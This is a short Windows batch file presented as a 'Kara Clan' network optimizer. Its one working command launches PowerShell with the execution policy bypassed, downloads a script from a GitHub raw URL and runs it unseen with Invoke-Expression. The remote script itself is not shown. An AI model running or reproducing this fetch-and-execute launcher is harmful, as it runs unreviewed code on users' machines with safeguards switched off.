@echo off
title Kara Clan - Optimizer Vol.1
echo ====================================================
echo   KARA CLAN OPTIMIZER - VOL.1
echo   Basic Network Optimization
echo ====================================================
echo.
echo Starting optimization...
echo This window will close automatically.
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { $url = 'https://raw.githubusercontent.com/TkPAIN/kara-clan-win-op/main/OptimizarWindows_v1.ps1'; $script = Invoke-RestMethod -Uri $url; Invoke-Expression -Command $script }"
